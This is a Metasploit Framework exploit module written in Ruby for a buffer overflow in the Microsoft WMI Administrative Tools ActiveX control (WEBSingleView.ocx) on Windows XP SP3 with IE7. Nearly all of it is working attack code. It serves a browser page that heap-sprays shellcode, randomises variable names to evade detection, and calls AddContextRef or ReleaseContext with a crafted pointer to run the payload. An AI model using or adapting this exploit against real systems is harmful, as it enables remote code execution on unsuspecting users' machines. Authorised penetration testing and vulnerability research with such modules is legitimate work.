##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ManualRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::BrowserAutopwn
	
	autopwn_info({
		:os_name    => OperatingSystems::WINDOWS,
		:rank       => NormalRanking,
		:vuln_test  => nil,
	})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft WMI Administration Tools ActiveX Buffer Overflow',
			'Description'    => %q{
					This module exploits a vulnerability in Microsoft WMI Administrative Tools 1.x. 
				When passing a parameter as an object pointer to the AddContextRef() or ReleaseContext() methods
				to the WEBSingleView.ocx ActiveX Control (1.50.1131.0), an attacker may be able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'WooYun', 'MC' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'URL', 'http://wooyun.org/bug.php?action=view&id=1006' ],
					[ 'URL', 'http://secunia.com/advisories/42693' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP3 / IE7',  { } ],
				],
			'DisclosureDate' => 'Dec 22 2010',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
		nops      = Rex::Text.to_unescape(make_nops(4))
		vname  = rand_text_alpha(rand(100) + 1)
		rand1  = rand_text_alpha(rand(100) + 1)
		rand2  = rand_text_alpha(rand(100) + 1)
		rand3  = rand_text_alpha(rand(100) + 1)
		rand4  = rand_text_alpha(rand(100) + 1)
		rand5  = rand_text_alpha(rand(100) + 1)
		rand6  = rand_text_alpha(rand(100) + 1)
		rand7  = rand_text_alpha(rand(100) + 1)
		rand8  = rand_text_alpha(rand(100) + 1)

		method_names = [
			"ReleaseContext",
			"AddContextRef",
			]

		method_name = method_names[rand(method_names.length)]

		content = %Q|
<html>
<object classid="clsid:2745E5F5-D234-11D0-847A-00C04FD7BB08" id="#{vname}"></object>
<script>
#{rand1} = unescape('#{shellcode}'); 
#{rand2} = unescape('%u0c0c%u0c0c');   
#{rand3} = 20;   
#{rand4} = #{rand3} + #{rand1}.length;   
while(#{rand2}.length < #{rand4}) #{rand2} += #{rand2};   
#{rand5} = #{rand2}.substring(0, #{rand4});   
#{rand6} = #{rand2}.substring(0, #{rand2}.length - #{rand4});   
while( #{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5};   
#{rand7} = new Array();   
for(#{rand8} = 0; #{rand8} < 450; #{rand8}++) #{rand7}[#{rand8}] = #{rand6} + #{rand1};   
#{vname}.#{method_name}(0x0c0c0c0c);   
</script>
</html>
		|

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
